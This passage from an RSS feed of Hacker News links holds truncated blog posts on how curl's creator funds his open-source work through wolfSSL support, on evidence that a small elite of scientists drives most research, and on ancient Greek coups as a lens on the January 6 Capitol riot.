<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="125" height="108" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 125px) 100vw, 125px"></figure></div>



<p>In the beginning of course, the first few years or so, this project wasn’t seen or discovered by many and just grew slowly and silently in a dusty corner of the Internet.</p>



<p>Already when I shipped the first versions I wanted the code to be open and freely available. For years I had seen the cool free software put out the in the world by others and I wanted my work to help build this communal treasure trove.</p>



<h2>License</h2>



<p>When I started this journey I didn’t really know what I wanted with curl’s license and exactly what rights and freedoms I wanted to give away and it took a few years and attempts before it landed.</p>



<p>The early versions were <a href="https://opensource.org/licenses/GPL-2.0">GPL licensed</a>, but as I learned about resistance from proprietary companies and thought about it further, I changed the license to be more commercially friendly and to match my conviction better. I ended up with <a href="https://opensource.org/licenses/MIT">MIT</a> after a brief experimental time using <a href="https://opensource.org/licenses/MPL-1.1">MPL</a>. (It was easy to change the license back then because I owned all the copyrights at that point.)</p>



<p>To be exact: we actually have a <a href="https://curl.se/docs/copyright.html">slightly modified MIT license</a> with some very subtle differences. The reason for the changes have been forgotten and we didn’t get those commits logged in the “big transition” to Sourceforge that we did in late 1999…  The end result is that this is now often recognized as “the curl license”, even though it is in effect the MIT license.</p>



<p>The license says everyone can use the code for whatever purpose and nobody is required to ship any source code to anyone, but they cannot claim they wrote it themselves and the license/use of the code should be mentioned in documentation or another relevant location.</p>



<p>As licenses go, this has to be one of the most frictionless ones there is.</p>



<h2>Copyright</h2>



<p>Open source relies on a solid copyright law and the copyright owners of the code are the only ones who can license it away. For a long time I was the sole copyright owner in the project. But as I had decided to stick to the license, I saw no particular downsides with allowing code and contributors (of significant contributions) to retain their copyrights on the parts they brought. To not use that as a fence to make contributions harder.</p>



<p>Today, in early 2021, I count 1441 copyright strings in the curl source code git repository. 94.9% of them have my name.</p>



<p>I never liked how some projects require copyright assignments or license agreements etc to be able to submit code or patches. Partly because of the huge administrative burden it adds to the project, but also for the significant friction and barrier to entry they create for new contributors and the unbalance it creates; some get more rights than others. I’ve always worked on making it easy and smooth for newcomers to start contributing to curl. It doesn’t happen by accident.</p>



<h2>Spare time</h2>



<p>In many ways, running a spare time open source project is easy. You just need a steady income from a “real” job and sufficient spare time, and maybe a server to host stuff on for the online presence.</p>



<p>The challenge is of course to keep developing it, adding things people want, to help users with problems and to address issues timely. Especially if you happen to be lucky and the user amount increases and the project grows in popularity.</p>



<p>I ran curl as a spare time project for decades. Over the years it became more and more common that users who submitted bug reports or asked for help about things were actually doing that during their <em>paid</em> work hours because they used  curl in a commercial surrounding – which sometimes made the situation almost absurd. The ones who actually got paid to work with curl were asking the unpaid developers to help them out.</p>



<p>I changed employers several times. I started my own company and worked as my own boss for a while. I worked for Mozilla on network stuff in Firefox for five years. But curl remained a spare time project because I couldn’t figure out how to turn it into a job without risking the project or my economy.</p>



<h2>Earning a living</h2>



<p>For many years it was a pipe dream for me to be able to work on curl as a real job. But how do I actually take the step from a spare time project to doing it full time? I give away all the code for free, and it is a solid and reliable product.</p>



<div><figure><a href="https://www.wolfssl.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png" alt="" width="186" height="144" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png 1011w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-200x155.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-450x348.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-768x594.png 768w" sizes="(max-width: 186px) 100vw, 186px"></a></figure></div>



<p>The initial seeds were planted when I met and got to know Larry (wolfSSL CEO) and some of the other good people at <a href="https://www.wolfssl.com/">wolfSSL</a> back in the early 2010s. This, because wolfSSL is a company that write open source libraries and offer commercial support for them – proving that it can work as a business model. Larry always told me he thought there was a possibility waiting here for me with curl.</p>



<p>Apart from the business angle, if I would be able to work more on curl it could really benefit the curl project, and then of course indirectly everyone who uses it.</p>



<p>It was still a step to take. When <a href="https://daniel.haxx.se/blog/2018/11/18/im-leaving-mozilla/" data-type="post" data-id="11748">I gave up on Mozilla</a> in 2018, it just took a little thinking before I decided to try it. <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">I joined wolfSSL</a> to work on curl full time. A dream came true and finally curl was not just something I did “on the side”. It only took 21 years from first curl release to reach that point…</p>



<p>I’m living the open source dream, working on the project I created myself.</p>



<h2>Food for free code</h2>



<p>We sell commercial support for curl and libcurl. Companies and users that need a helping hand or swift assistance with their problems can get it from us – and with me here I dare to claim that there’s no company anywhere else with the same ability. We can offload engineering teams with their curl issues. Up to 24/7 level!</p>



<p>We also offer custom curl development, debugging help, porting to new platforms and basically any other curl related activity you need. See more on the <a href="https://www.wolfssl.com/products/curl/">curl product page</a> on the wolfSSL site.</p>



<p>curl (mostly in the shape of libcurl) runs in <strong>ten billion installations</strong>: some five, six billion mobile phones and tablets – used by several of the most downloaded apps in existence, in virtually every website and Internet server. In a billion computer games, a billion Windows machines, half a billion TVs, half a billion game consoles and in a few hundred million cars… curl has been made to run on 82 operating systems on 22 CPU architectures. Very few software components can claim a wider use.</p>



<p><em>“Isn’t it easier to list companies that are <strong>not</strong> using curl?”</em></p>



<p>Wide use and being recognized does not bring food on the table. curl is also totally free to download, build and use. It is very solid and stable. It performs well, is documented, well tested and “battle hardened”. It “just works” for most users.</p>



<h2>Pay for support!</h2>



<p>How to convince companies that they should get a curl support contract with me?</p>



<p>Paying customers get to influence what I work on next. Not only distant road-mapping but also how to prioritize short term bug-fixes etc. We have a guaranteed response-time.</p>



<p>You get your issues first in line to get fixed. Customers also won’t risk getting their issues added the known bugs document and put in the attic to be forgotten. We can help customers make sure their application use libcurl correctly and in the best possible way.</p>



<p>I try to emphasize that by getting support from us, customers can  take away some of those tasks from their own engineers and because we are  faster and better on curl related issues, that is a pure net gain economically. For all of us.</p>



<p><strong>This is not an easy sell.</strong></p>



<p>Sure, curl is used by thousands of companies everywhere, but most of them do it because it’s free (in all meanings of the word), functional and available. There’s a real challenge in identifying those that actually use it enough and  value the functionality enough that they realize they want to improve their curl foo.</p>



<p>Most of our curl customers purchased support first when they faced a complicated issue or problem they couldn’t fix themselves –  this fact gives me this weird (to the wider curl community) incentive to <em>not</em> fix some problems too fast, because it then makes it work against my ability to gain new customers!</p>



<p>We need paying customers for this to be sustainable. When wolfSSL has a sustainable curl business, I get paid and the work I do in curl benefits all the curl users; paying as well as non-paying.</p>



<h2>Dual license</h2>



<p>There’s clearly business in releasing open source under a strong copyleft license such as GPL, and as long as you keep the copyrights, offer customers to purchase that same code under another more proprietary- friendly  license. The code is still open source and anyone doing totally open things can still use it freely and at no cost.</p>



<p>We’ve shipped <a href="https://curl.se/tiny/">tiny-curl</a> to the world licensed under GPLv3. Tiny-curl is a curl branch with a strong focus on the<em><strong> </strong></em><strong>tiny</strong> part: the idea is to provide a libcurl more suitable for smaller systems, the ones that can’t even run a full Linux but rather use an RTOS.</p>



<p>Consider it a sort of experiment. Are users interested in getting a smaller curl onto their products and are they interested in paying for licensing. So far, tiny-curl supports two separate RTOSes for which we haven’t ported the “normal” curl to.</p>



<h2>Keeping things separate</h2>



<p>Maybe you don’t realize this, but I work hard to keep separate things compartmentalized. I am not curl, curl is not wolfSSL and wolfSSL is not me.  But we  all overlap greatly!</p>



<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg" alt="" width="599" height="562"></a><figcaption>The Daniel + curl + wolfSSL trinity</figcaption></figure>



<p>I work for wolfSSL. I work on curl. wolfSSL offers commercial curl support.</p>



<h2>Reserved features</h2>



<p>One idea that we haven’t explored much yet is the ability to make and offer “reserved features” to paying customers only. This of course as another motivation for companies to become curl support customers.</p>



<p>Such reserved features would still have to be sensible for the curl project …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</a></em></p>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788122</guid>
            <pubDate>Fri, 15 Jan 2021 07:49:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Newton hypothesis: Is science done by a small elite?]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25787745">thread link</a>) | @barry-cotter
<br/>
January 14, 2021 | https://nintil.com/newton-hypothesis | <a href="https://web.archive.org/web/*/https://nintil.com/newton-hypothesis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In previous posts I <a href="https://nintil.com/hhmi-and-nih">said</a> that the extent to which "Fund people" works will depend on the distribution of scientific talent. Think about the following situation: Imagine that only a handful of scientists at every point in time are able to –if given the time and means–lead revolutions on par with the work of Darwin, Einstein, or Galileo (This is an extreme case admittedly because most of science does not look like this; most of science is more incremental and less memorable). I recently found two authors that believe something like this,</p>
<p>Braben, whose <a href="https://nintil.com/review-scientific-freedom">book</a> <em>Scientific Freedom</em> I reviewed says that even though most scientists could be the next Einstein if they tried, only a few will even try:</p>
<blockquote>
<p>It is possible that my message may be seen as elitist and of interest only to <strong>those very few scientists who might be putative members of a twenty - first century Planck Club</strong>. That interpretation would be wrong. One of the themes here is that almost every serious researcher is at some time in a career capable of taking those fateful steps that might lead to a great discovery or the creation of penetrating new insight. They might then need to draw on vast reserves of courage and determination, and perhaps also a little luck if they are to make progress. At any one time, of course, <strong>the proportion of researchers ready to seize that possibly once - in - a - lifetime opportunity will be very small</strong>, so if they are prevented from doing so the democratic pressure they can exert is insignifican't. [...] a properly constituted TR initiative should appeal to only a small number of scientists with radical thoughts on their minds. The challenge is to recognize them as there are millions of scientists, and one does not even know which haystack hides the needle. [...] <strong>Let us assume that there were about 300 transformative researchers — the extended membership of the Planck Club — during the twentieth century.</strong></p>
</blockquote>
<p>In physics, <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">Lee Smolin</a> is even more on the elitist side, with even fewer scientists in the revolutionaries' club:</p>
<blockquote>
<p>“But when it comes to theoretical physics, we are not talking about much money at all. Suppose that an agency or foundation decided to fully support <strong>all the visionaries</strong> who ignore the mainstream and follow their own ambitious programs to solve the problems of quantum gravity and quantum theory. <strong>We are talking about perhaps</strong> <strong>two dozen theorists</strong>. Supporting them fully would take a tiny fraction of any large nation’s budget for physics.”</p>
</blockquote>
<p>I think there is something to this view, and it is not incompatible with what I said in my last blogpost (That peer review can select the best work). In physics, there has been <a href="https://nintil.com/is-useful-physics-over/">no progress</a> in the <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">fundamentals</a> of the <a href="https://www.amazon.com/Lost-Math-Beauty-Physics-Astray/dp/0465094252/ref=tmm_hrd_swatch_0?_encoding=UTF8&amp;qid=1610576984&amp;sr=8-2">field</a> since the 70s, so one could argue that perhaps there are key assumptions that need to be thrown away, that there is a strong need for funding what to many physicists seem obviously wrong. In that case peer review may be stifling progress: physics could benefit from less clever math and more philosophical thought, going back to the mode of thinking of Einstein et al. as Smolin suggests. Braben does not oppose peer review in general, he argues that peer review will systematically underrate those coming up with paradigm-breaking ideas, and most of science is not that.</p>
<p>
[1]. Who are biology's geniuses? Darwin? Biology is probably less of a Kuhnian world than physics is, given that biology has fewer strong assumptions baked in that would have to be overthrown and thus count as a revolution
</p>
<p>In biology, in contrast with physics, whatever the current framework is (if any)<sup><a href="#sidenote-1">1</a></sup>, it continues to be extremely fruitful. If one takes <a href="https://www.nobelprize.org/uploads/2020/10/advanced-chemistryprize2020.pdf">CRISPR</a>, which has been arguably been a case of "good science", one can break it down into:</p>
<ol>
<li>
<p>Noticing that there are suspicious repetitive sequences in certain bacteria</p>
</li>
<li>
<p>Figuring out what those are for</p>
</li>
<li>
<p>Leveraging them into a tool for gene editing</p>
</li>
<li>
<p>Further improving CRISPR (e.g. Prime Editing)</p>
</li>
</ol>
<p>None of these examples of good science (Or perhaps engineering if you count the last 2) are paradigm shifts but without any doubt CRISPR has been highly useful and influential, both in academia, and soon in the clinic.</p>
<p>In <a href="https://d1wqtxts1xzle7.cloudfront.net/30686866/Ineq_Wikipedia.pdf?1361917900=&amp;response-content-disposition=inline%3B+filename%3DOn_the_inequality_of_contributions_to_Wi.pdf&amp;Expires=1610411522&amp;Signature=P7P2cCDnu6yNhrt1L64caVUnkBRb40qvLrCZnROjgKvsSB9IP2MavdPs86gdf6AQYNf0FPLRXnH1K-dza1dQ4mBrvhWyoAUAYMlx%7EMXivPNvU9HK%7En5l59Etl8afosE63Odc9gz5aMsWVEAZTkGfgV3peaiEbk7I%7EQfQGhLsAyvz5JXI5YBJHK8u1EWrDN9xnkgKpXavLnv0-L046CM-BJntNX2sMR6j60Lt1nnZ%7ELGYQtWsn0ixPMxhDoNzNcPRCz7y%7Ef5vUQG7KGqRt-xAG%7EOZAyM78RpSF2mp871PHkbf9w1bnojA-ibc8QlJRGtb00qDEEGLV8qi7Y0bQqimWQ__&amp;Key-Pair-Id=APKAJLOHF5GGSLRBV4ZA">wikipedia</a>, only a small fraction (10%) of the active users do most (90%) of the edits. Is science like this, or even more extreme? <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0101698">Ioannidis</a> et al. (2014) note there are 15M scientists that published anything in the 1996-2011 period, but only 1% that has published every single year in this period. This smaller 150k-strong group accounts for 40% of all papers and 87% of all papers with &gt;1000 citations.</p>
<p>Nobel Prize winner William Shockley published (<a href="https://ieeexplore.ieee.org/document/4056505">1957</a>) a paper measuring the distribution of productivity in an already high-performing environment: the Los Alamos Scientific Laboratory as well as the Brookhaven National Laboratory. Shockley finds a log-normally distribution of publications and patents: Most scientists publish very little and a progressively smaller count publish increasingly more.</p>
<p>There's the observation of Lotka's law (Yes, it's the same Lotka as in Lotka-Volterra) that says that the relative frequency of authors with a given number of publications follows a power law that scales with the square of the number of articles published; for example out of 100 scientists who publishes at least 1 article, only 1 will publish 10 articles. The precise exponent may vary by discipline (Pao, <a href="https://asistdl.onlinelibrary.wiley.com/doi/abs/10.1002/(SICI)1097-4571(198601)37:1%3C26::AID-ASI4%3E3.0.CO;2-Z">1985</a>), but each one does seem to follow the same pattern: A handful of people publish an overwhelming fraction of all the papers.</p>
<p>We could say "We only remember a handful of scientists that advanced modern physics, so that must imply you only need that handful". Back in the early 20th century, how many physicists did "useful" work that ended up leading to currently accepted and useful knowledge? Sure we remember Einstein, Planck, Hilbert, Lorentz, Mach, Poincaré, and Minkowski. But How many physicists total were there back then? Lotka's paper samples Auerbach's <em><a href="https://archive.org/details/geschichtstafel00auergoog">Geschichtstafeln der Physik</a></em> (1910) which compiles physicists the author considered sufficiently important. The book was published 5 years after Einstein's Annus Mirabilis and he's not yet cited there, Auerbach stops at the year 1900. Turns out there are more physicists than just the famous ones (Perhaps we are biased towards those that worked in one particular area that ended up changing the foundations of physics). For example we have <a href="https://en.wikipedia.org/wiki/Heinrich_Kayser">Heinrich Kayser</a> who did pioneering work on, and coined the expression, "adsorption". I bet you hadn't heard of him before. It wouldn't be enough to just count all the names in the <em>Geschichtstafeln</em> and then try to come up with a total count of physicists; even that book can be undercounting physicists that still contributed (For example, that were cited by the authors mentioned in the book). Fortunately now we have indices with journals and citations so we can truly take something closer to the entire population of scientists and explore in more detail the <em>Ortega hypothesis</em>.</p>

<blockquote>
<p>The Ortega hypothesis predicts that highly-cited papers and medium-cited (or lowly-cited) papers would equally refer to papers with a medium impact. The Newton hypothesis would be supported if the top-level research more frequently cites previously highly-cited work than that medium-level research cites highly-cited work. [From the Bornmann paper cited later]</p>
</blockquote>
<p>Or to state it in a more direct way: <em>Most science does not matter</em>, it is a small circle of elites of today that feeds into a small circle of elites in the future.</p>
<p>Cole &amp; Cole (<a href="https://science.sciencemag.org/content/178/4059/368.abstract">1972</a>) is the seminal examination of this question, which led to an entire literature around whether or not the Ortega hypothesis is true or not. They took the most cited paper from each of 84 physicists and looked at the work they cited. 60% of it was to researchers at "top nine" departments (Which comprise 21% of the entire population of physicists), 43% of citations were to researchers that themselves were highly (&gt;60) cited [in a given period of time], despite those being only 8% of all papers. 70% of citations were to researchers that have one or more honorific awards, despite them being 26% of all physicists.</p>
<p>They also replicated this in a larger sample, taking the top 10 papers most cited in <em>Physical Review</em>, they looked at the work cited by those; so take one of those papers, get all the cited authors, compute their total citations and see if this authors are disproportionately more cited than the average author; and they are. The same is true for not so highly cited papers, leading the authors to conclude that T<em>hese data offer further support for the hypothesis that even the producers of research of limited impact depend predominantly on the work produced by a relatively small elite.</em>. </p>
<blockquote>
<p>It seems, rather, that a relatively small number of physicists produce work that becomes the base for future discoveries in physics. We have found that even papers of relatively minor significance have used to a disproportionate degree the work of the eminent scientists.</p>
</blockquote>
<p>Nobel Prize winners, unsurprisingly are extremely well cited even before they get the award,</p>
<blockquote>
<p>The average number of citations in the 1961 SCI to the work of Nobel laureates (who won the prize in physics between 1955 and 1965) was 58, as compared with an average of 5.5 citations for other scientists. Only 1.08 percent of the quarter of a million scientists who appear in the 1961 SCI received 58 or more citations. We thought it possible that winning the prize might make a scientist more visible and lead to a greater number of postprize citations than the quality of his work warranted. We therefore divided the laureates into two groups: those who won the prize five or fewer years before 1961 and those who won it after that year. The 1957-1961 laureates were cited an average of 42 times in the 1961 SCI; the future prize winners (those winning the prize between 1961 and 1965), an average of 62 times. Since the prospective laureates were more often cited than the actual laureates, we concluded that the larger number of …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nintil.com/newton-hypothesis">https://nintil.com/newton-hypothesis</a></em></p>]]>
            </description>
            <link>https://nintil.com/newton-hypothesis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787745</guid>
            <pubDate>Fri, 15 Jan 2021 06:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Insurrections, Ancient and Modern (and Also Meet the Academicats)]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25787594">thread link</a>) | @parsecs
<br/>
January 14, 2021 | https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>So this week I want to talk about how what I know a historian influences how I am interpreting what I am going to call the Capitol Insurrection that happened on Wednesday, January 6 instead of taking the week off as I had originally planned. Since that is a really heavy topic, I am also going to do what I was <em>originally </em>planning to do this week,<strong> which was to share pictures of the two adorable little cats the Pedant-Household has adopted.</strong></p>



<p>They are named Oliver and Percival (Oliver after the knight from <em>The Song of Roland</em> and Percival after the knight from Arthurian legends, particularly Chretien de Troyes), and they are super-friendly and also oppose insurrectionists.</p>



<figure><img data-attachment-id="5936" data-permalink="https://acoup.blog/pxl_20210114_215722402/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610643442&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1117&quot;,&quot;shutter_speed&quot;:&quot;0.041667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210114_215722402" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver (left) and Percival (right) seen here occupying the Pedant’s <a href="https://acoup.blog/category/fireside/">Fireside Chair</a>.</figcaption></figure>



<p>(Note that I have turned off comments for this post.  I know we all have opinions on this, often very strong opinions that others might find very frustrating.  I don’t particularly want to moderate that discussion and in any event, you are, at this point, much better off (if you are in the United States) <a href="https://youtu.be/KXXYkLa-HHI">Contacting Your Representatives</a> with your opinion, rather than arguing on the internet.)</p>



<p>We already talked, <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">back in October</a>, about civil strife – <em>stasis</em> – in Greek communities and about how I thought that the United States has found itself in the early but accelerating stages of <em>stasis</em> as described by ancient Greek writers (I also worked in some Roman examples, but I really think the Greek parallel is more useful, as the fall of the Roman Republic was so heavily influenced by the involvement of the Roman Army; the United States military has played no such role, nor indicated it is interested in doing so.  For now, the civil-military relationship remains relatively healthy).</p>



<p>I’m going to assume you have all of that already, so if you want to go back and look at how I described <em>stasis</em> and what that meant, you may want to do that first.  Instead, I want to move forward and discuss what thinking in terms of <em>stasis</em> means in understanding the Capitol Insurrection and in particular the relevance of that Greek model of <em>stasis</em> in understanding both what has happened and what may need to happen going forward.  Starting with:</p>



<h2>This Was Serious</h2>



<p>While the insurrection was happening and in its immediate aftermath, there was a tendency to focus on the more frivolous, silly parts of it.  And there were truly silly looking things.  And there are still commentators – some deluded, some acting in bad faith – attempting to insist that this wasn’t serious.  <strong>They are wrong; the Capitol Insurrection was deadly serious</strong> both in the very literal sense that <em>people died</em> (which I think seems to be missed in some quarters), but also for what it means.  And, as time has passed and <a href="https://www.washingtonpost.com/dc-md-va/2021/01/14/dc-police-capitol-riot/?arc404=true">more reporting has been done</a> on <a href="https://twitter.com/CalebJHull/status/1348334770103660553">what was happening</a>, it has become increasingly apparent that we were perhaps <em>moments </em>away from mass-casualty events (either where politicians were taken by the mob or where the mob so endangered law enforcement or politicians that lethal force was required that would have left many insurrectionists dead).</p>



<p><strong>No ancient Greek would have had any trouble in understanding what happened on the 6th or that it was a serious attempt</strong> (albeit an incompetent one) <strong>to seize power</strong>.  Having a leader or a political faction move with a mob (often armed, but not always so) to<strong> try to disperse the normal civic assemblies of a Greek <em>polis</em> and occupy their normal meeting place was a standard maneuver to try to seize power during <em>stasis</em></strong>. As Dr. <a href="https://twitter.com/Roelkonijn">Roel Konijnendijk</a>, an ancient Greek history specialist, noted in this <a href="https://www.reddit.com/r/AskHistorians/comments/ks082p/meta_todays_sedition_at_the_united_states_capitol/giexmxe/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">excellent discussion</a> on the r/AskHistorians reddit (where he posts as Iphikrates), “In the Greek world, most attempts to seize power by force tended to take the same form: the seditious party would contrive an opportunity to gather in arms while their opponents were unarmed and off-guard, and seize control of all public spaces.”</p>



<p><strong>To take merely the examples in Athens</strong>, Cylon (the ‘c’ is hard, so Ki-lon – or if you prefer the Greek, Ku-lon – not Psi-lon) attempted it in 632, trying to seize the Athenian Acropolis with an armed mob (Thuc. 1.126; Hdt. 5.71; Plut. <em>Sol.</em> 12.1-2). Cylon’s effort failed in appropriately tragicomic fashion, with his supporters seeking shelter in the temple of Athena and only coming out with a cord that connected them to the altar and its notional protection (the cord breaks and they are all slain, Plut. <em>Sol</em>. 12).  Peisistratos also did it that way in Athens in 561 (Hdt. 1.59) using handpicked bodyguard that he armed with clubs, rather than spears; I cannot help but note just how many things we saw being used as clubs on the 6th. After the Pesistratids were thrown out, Isagoras attempted (with support from the Spartan king Cleomenes I) to institute an oligarchy the same way, seizing the Acropolis, but failing to take the Athenian <em>agora</em>; the Athenians rallied under the democratic leader Cleisthenes and besieged Cleomenes and Isagoras on the Acropolis (Hdt. 5.72; Arist. <em>Ath. Pol</em>. 20.1-4). Later in 411, the ‘Four Hundred’ would seize power in exactly the same way, arriving with a mob of armed supporters to disperse the Athenian <em>boule</em> – it’s council (Thuc. 8.69).  <strong>That’s four examples of this exact tactic from Athens alone</strong> (Athens was by no means the most <em>stasis</em>-prone ancient state, by the way – that was almost certainly Syracuse).</p>



<p>Moreover, <strong>One thing about coup attempts like this in the ancient world: they all look farcical, unless they work.</strong>  Peisistratos’ band of club-armed bodyguards would have looked terribly silly, except that they succeeded, for a time (put a pin in that, we’ll come back to it).  Peisistratos’ second attempt actually built support with something about as farcical as the <a href="https://www.bbc.com/news/world-us-canada-55606044">Q-Anon Shaman</a>, by riding into Athens on a chariot accompanied by a particularly tall woman dressed as Athena (Hdt. 1.60.2-5); the demonstration was taken by some as a sign of divine support. One assumes many Athenians thought it was laughable (Herodotus certainly does), but it was the precursor to another effort to seize power which also worked, albeit temporarily.</p>



<p>Just because it looks silly doesn’t mean it can’t work.  <strong>This was very serious</strong> and <strong>anyone pretending that ‘censorship’ on Twitter</strong> (a <em>private</em> platform, I thought these folks believed in markets?) <strong>or mean – but true – words from angry politicians is more consequential <em>than the violent attempt to seize the seat of government</em> is either a fool, an enemy, or both</strong> (though I will note that there is a world of difference between ‘fools’ and ‘enemies’ – fools may be persuaded and doing so is essential, see below.  We are all foolish at times; it is the cynics that get my dander up).</p>



<figure><img data-attachment-id="5938" data-permalink="https://acoup.blog/pxl_20210110_223238849-mp_/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610299958&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1919&quot;,&quot;shutter_speed&quot;:&quot;0.066683&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210110_223238849.mp_" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver, acting as my loyal research assistant.</figcaption></figure>



<h2>This Is Not Over</h2>



<p>Let’s come back to Peisistratos, because he is instructive here.  Peisistratos tried to make himself tyrant of Athens <em><strong>twice</strong></em> before his third attempt succeeded. We’ve discussed his <strong>first attempt </strong>above (in 561), where Peisistratos attempted to use a club-armed bodyguard to seize the city (Hdt. 1.59); that worked, but he was overthrown in a counter-coup sometime after (Hdt. 1.60.1; this was not immediately though, Herodotus notes that Peisistratos had time to set government affairs, Hdt. 1.59.6).</p>



<p><strong>For the <em>second</em> attempt </strong>in 559, Peisistratos made a key alliance with Megacles – someone we might term an ‘establishment’ figure in the Athenian politics of the day, looking to get the edge on his rivals in the continuing Athenian <em>stasis</em> (Herodotus uses the very word, I should note). He was then brought into the city (the chariot bit above, Hdt. 1.60.2-5) and seized power <em>again</em>, with a mob of his supporters. This effort ends because Peisistratos offends Megacles and once his ally turns on him, he is exiled again (Hdt. 1.61.1-2).</p>



<p>But that wasn’t the end of the matter. Peisistratos, once out of power again used his wealth and support – often foreign support, we are told – to raise an army, hire mercenaries (Argives, Herodotus reports) and rally his supporters before storming back into Athens in 545 (Hdt. 1.16.3-4). Herodotus notes that a great flock of Peisistratos’ partisans from the city swarmed out to support him (this should sound more than a little familiar) and<strong> with that mix of mercenaries and mob he was able to catch the Athenians unprepared</strong> (Hdt. 1.63.1) and scattered them, then used a mix of misinformation (implying he intended no violence, Hdt. 1.63.2) and speed to seize the key parts of the city to keep the Athenians disorganized. And then he murdered or exiled all of his enemies (Hdt. 1.64.3) because that is what tyrants <em>do</em>, whatever they are assuring you about their peaceful intentions ahead of time. People who seize power with violence instead of with votes do not suddenly become pacifists when they win!</p>
